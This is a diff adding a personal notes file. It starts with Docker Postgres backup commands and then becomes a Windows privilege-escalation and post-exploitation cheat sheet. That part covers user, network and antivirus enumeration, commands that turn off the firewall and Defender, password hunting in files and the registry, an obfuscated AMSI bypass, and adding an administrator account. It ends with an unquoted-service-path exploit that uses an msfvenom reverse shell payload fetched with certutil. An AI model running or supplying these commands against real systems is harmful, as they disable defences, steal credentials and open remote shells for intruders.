@@ -1,0 +1,124 @@
+docker exec -t your-db-container pg_dumpall -c -U postgres > dump_`date +%d-%m-%Y"_"%H_%M_%S`.sql
+cat your_dump.sql | docker exec -i your-db-container psql -U postgres
+
+Backup Database
+generate sql:
+docker exec -t your-db-container pg_dumpall -c -U your-db-user > dump_$(date +%Y-%m-%d_%H_%M_%S).sql
+
+to reduce the size of the sql you can generate a compress:
+docker exec -t your-db-container pg_dumpall -c -U your-db-user | gzip > ./dump_$(date +"%Y-%m-%d_%H_%M_%S").gz
+
+Restore Database
+cat your_dump.sql | docker exec -i your-db-container psql -U your-db-user -d your-db-name
+
+to restore a compressed sql:
+gunzip < your_dump.sql.gz | docker exec -i your-db-container psql -U your-db-user -d your-db-name
+
+
+-----LOCAL USER ENUMERATION-----
+echo %USERNAME% || whoami
+$env:username  (ps)
+whoami /priv
+whoami /groups
+whoami /all
+Get-LocalUser |ft name,enabled,lastlogon (ps)
+Get-ChildItem c:\Users -force (ps)
+Get-ChildItem c:\Users -force | select name (ps)
+net accounts
+net user administrator
+net localgroup
+net localgroup Administrators
+Get-LocalGroupMember Administrators (ps)
+Get-LocalGroupMember Administrators | ft name, principalsource (ps)
+
+------NETWORK ENUMERATION-------
+ipconfig /all
+Get-NetIPConfiguration (ps)
+Get-NetIPConfiguration | ft InterfaceAlias, interfaceDescription, ipv4addressne
+Get-DnsClientServerAddress -Addressfamily ipv4
+nslookup {ip} #to see hostname
+route print
+Get-NetRoute -Addressfamily ipv4
+arp -a
+Get-NetNeighbor -addressfamily ipv4
+netstat -ano
+netsh firewall show state
+netsh firewall show config
+$f=New-object -comObject HNetCfg.FwPolicy2; $f.rules | where {$_.action -eq "0"}|select name,applicationname,localports #to see blocked ports app and ports by firewall
+netsh firewall set opmode disable #to disable firewall
+netsh advfirewall set allprofiles state off #to disale all firewall profile
+
+------ANTIVIRUS & FIREWALL ENUMERATION----------
+Get-MpComputerStatus
+netsh advfirewall show domain
+netsh advfirewall show private
+netsh advfirewall show public
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableIoAVProtection $true
+netsh advfirewall set allprofiles state off #to disale all firewall profile
+$a=Get-ApplockerPolicy -effective; $a.rulecollections #to check locked apps
+
+---------HUNTING PASSWORDS----------
+cd C:\ & findstr /SI /M "password" *.xml *.xml *.ini *.txt (cmd) # to look for files containing password in it
+dir /s /B *pass*.txt == *pass*.xml == *pass*.ini ==*cred* == *vnc* ==*.config* (cmd) #to look for files
+where /R C:\ user.txt # does same as locate in linux
+REG QUERY HKLM /F "password" /t REG_SZ /S /K #search for key name and passwords in registry
+
+-------TOOLS FOR LOCAL PRIVILAGE ESCALATION-----
+JAWS --> a. https://github.com/411Hall/JAWS
+	 b. import-module .\jaws-enum.ps1
+WinPeas --> a. https://github.com/carlospolop/privileage-escalation-awesome-scripts-suite
+	    b. winpeas.bat
+PowerUp --> a. import-module .\PowerUp.ps1
+	    b. invoke-AllChecks
+	    c. https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
+
+powershell -ep bypass # to bypass ps execusion policy
+#to bypass Antivirus monitoring software (AMSI)
+SET-ItEM ('V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' )) ; ( GeT-VariaBle ("1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ("{0}{2}{1}" -f 'ansi','d','InitFaile' ),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T` VaLUE"( ${n`ULl},${t`RuE})
+
+
+systeminfo
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+wmic qfe #to check security patches
+
+download sherlock.ps1 from github
+import-module .\Sherlock.ps1
+Find-AllVulns
+
+#windows certificate bypass
+user /add username password #to add an user account
+net localgroup administrators username /add #to add the user to adminstrator group
+
+-------SCHEDULE TASKS and Unquoted PATH exploit----------
+powershell.exe -ep Bypass -File .\jaws-enum.ps1
+
+***with admin privs to create a vulnerable service path***
+sc create "VK9 Security Vulnerable Service" binpath= "C:\Program Files\Vk9 Security\binary files\executable files\real-program.exe" Displayname= "Vk9 Vuln Service" start= auto #to create a service path
+Get-Service (ps)
+Get-Service -DisplayName “Vk9 Vuln Service”
+sc query "VK9 Security Vulnerable Service" state=all
+mkdir "C:\Program Files\Vk9 Security\binary files\executable files\"
+icacls "C:\Program Files\Vk9 Security/binary files" #to check directory users permissions
+icacls "C:\Program Files\Vk9 Security/binary files" /GRANT "BUILTIN\Users":W #to give Users a write permission
+***with user/attacker priv to bypass and escalate to admin priv***
+wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """ #this will find service paths with this unquoted-service-path vulnerability
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\VK9 Security Vulnerable Service" #query via registry
+
+use powerUp.ps1 shell to enumerate this too
+Import-Module .\PowerUp.ps1
+Invoke-AllCheck or use Get-UnquotedService
+
+icacls "C:\Program Files\Vk9 Security/binary files" #confirm that we have rwad/wright permission in this directory
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.7 LPORT=7777 -f exe -o executable.exe #create a reverse shell payload on linux
+cd "C:\Program Files\Vk9 Security\binary files"
+certutil -urlcache -split -f “http://192.168.0.13:9999/executable.exe” executable.exe
+sc stop "VK9 Security Vulnerable Service"
+sc qc "VK9 Security Vulnerable Service"
+if the sc stop dont work, reboot the system.
+
+--- SEImperosnate -----
+
+
+
+
